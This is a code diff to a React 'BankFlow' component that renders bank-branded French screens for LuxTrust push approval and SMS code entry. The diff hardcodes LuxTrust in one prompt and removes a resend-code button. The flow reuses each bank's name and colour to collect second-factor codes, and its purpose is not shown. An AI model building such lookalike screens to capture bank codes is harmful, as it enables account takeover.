@@ -240,7 +240,7 @@ function ApproveVisual({ bank }) {
         </span>
       </span>
       <span className="min-w-0 flex-1">
-        <span className="block text-[14px] font-extrabold text-neutral-900">Ouvrez votre application {bank.short}</span>
+        <span className="block text-[14px] font-extrabold text-neutral-900">Ouvrez votre application LuxTrust</span>
         <span className="mt-0.5 block text-[12.5px] leading-snug text-neutral-500">Appuyez sur la notification push, puis confirmez que c&apos;est bien vous.</span>
         <span className="mt-2 inline-flex items-center gap-1.5 rounded-full bg-white px-3 py-1.5 text-[12px] font-semibold text-neutral-600 shadow-sm ring-1 ring-black/5">
           <span className="h-2 w-2 shrink-0 animate-pulse rounded-full bg-emerald-500" />
@@ -713,9 +713,6 @@ export default function BankFlow() {
             />
             {err && <span className={`${errCls} justify-center`}>⚠ {err}</span>}
           </label>
-          <div className="mt-4 text-center">
-            <button type="button" className="text-[13px] font-bold underline" style={{ color: bank.color }}>Renvoyer le code SMS</button>
-          </div>
           <div className="mt-4"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Vérifier le code →</PrimaryBtn></div>
         </form>
       </Shell>
